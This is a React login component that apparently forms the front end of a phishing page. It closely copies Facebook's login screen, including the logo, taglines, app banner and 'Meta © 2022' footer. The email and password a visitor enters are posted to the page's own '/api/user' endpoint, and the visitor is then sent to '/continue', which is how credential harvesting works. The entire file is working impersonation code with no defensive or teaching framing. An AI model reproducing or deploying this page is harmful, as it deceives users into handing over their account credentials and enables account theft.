import React, { useState } from 'react'
import F_phone from '../imgs/f_phone.png'
import F_logo from '../imgs/facebook_logo.svg'
import axios from 'axios'

function Login() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')

  const handleSubmit = async e => {
    e.preventDefault()
    try {
      const res = await axios.post('/api/user', {
        email, password
      })

      if(res) {
        window.location.href = '/continue'
      }
    } catch (err) {
      console.log(err)
      alert(err)
    }
  }

  return (
    <div className='login__form'>
      <header className='header'>
        <img src={F_phone} alt="" />
        <span>Get Facebook for Android and browse faster.</span>
      </header>

      <div className="row">
        <div className="column2">
          <img className='facebook_logo' src={F_logo} alt="facebook logo" />
          <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>

        <div className="column2">
          <form className='form' onSubmit={handleSubmit} >
            <input type="text" className='input' onChange={e => setEmail(e.target.value)} placeholder='Email address or phone number' required />
            <input type="password" className='input' onChange={e => setPassword(e.target.value)} placeholder='Password' required />
            <input type="submit" className='button login' value="Log In" />
            <span>Forgotten password?</span>
            <div className="border"></div>
            <input type="submit" className='button create' value="Create New Account" />
          </form>

          <span className='create__page'><strong>Create a Page</strong> for a celebrity, brand or business.</span>
        </div>
      </div>

      <footer className="footer">
        <div className="footer__columns">
          <div className="box">
            <span>English (UK)</span>
            <span>العربية</span>
            <span>Español (España)</span>
            <span>Deutsch</span>
          </div>

          <div className="box">
            <span>Français (France)</span>
            <span>ⵜⴰⵎⴰⵣⵉⵖⵜ</span>
            <span>Português (Brasil)</span>
            <span className='span__plus'>+</span>
          </div>
          
          <div className="box">
            <span>About · Help · More</span>
            <span>Meta © 2022</span>
          </div>
        </div>
      </footer>
    </div>
  )
}

export default Login